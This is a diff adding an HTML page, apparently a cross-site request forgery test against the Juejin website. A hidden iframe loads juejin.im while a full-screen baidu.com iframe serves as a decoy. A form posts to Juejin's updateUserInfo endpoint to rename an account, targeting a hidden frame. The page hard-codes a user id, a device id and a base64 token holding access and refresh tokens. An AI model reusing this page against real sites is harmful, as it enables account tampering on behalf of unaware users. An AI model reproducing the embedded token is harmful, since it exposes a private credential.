@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>测试掘金</title>
+    <style>
+        html{
+            width:100%;
+            height: 100%;
+        }
+        .iframe{
+            width: 100%;
+            height: 100%;
+            /* position: absolute; */
+        }
+    </style>
+</head>
+<body>
+    <img src="https://xiaoce-discount-storage-api-ms.juejin.im/v1/getNewUserDiscountTicketDetail?uid=&client_id=&token=&src=web" alt="">
+    <iframe src="https://juejin.im/" frameborder="0" style="display: none"></iframe>
+    <iframe src="https://www.baidu.com/" frameborder="0" class="iframe"></iframe>
+    <iframe src="" frameborder="0" name="formIframe"></iframe>
+    <form action="https://user-storage-api-ms.juejin.im/v1/updateUserInfo" method="POST" target="formIframe">
+        <input type="text" name="src" value="web" />
+        <input type="text" name="field" value="username" />
+        <input type="text" name="value" value="heyff125" />
+        <input type="text" name="uid" value="582595a90ce4630058bd0c31" />
+        <input type="text" name="token" value="eyJhY2Nlc3NfdG9rZW4iOiJHZnJjWmpGRzZwRmFoaXVzIiwicmVmcmVzaF90b2tlbiI6IlZldVE1RGE4NThzR3FEN04iLCJ0b2tlbl90eXBlIjoibWFjIiwiZXhwaXJlX2luIjoyNTkyMDAwfQ==" />
+        <input type="text" name="device_id" value="1575780521765" />
+        <button type="submit">提交</button>
+    </form>
+    <script>
+        var img = document.getElementsByTagName('img')[0]
+        img.onload=function(val){
+            console.log(val)
+
+        }
+    </script>
+</body>
+</html>
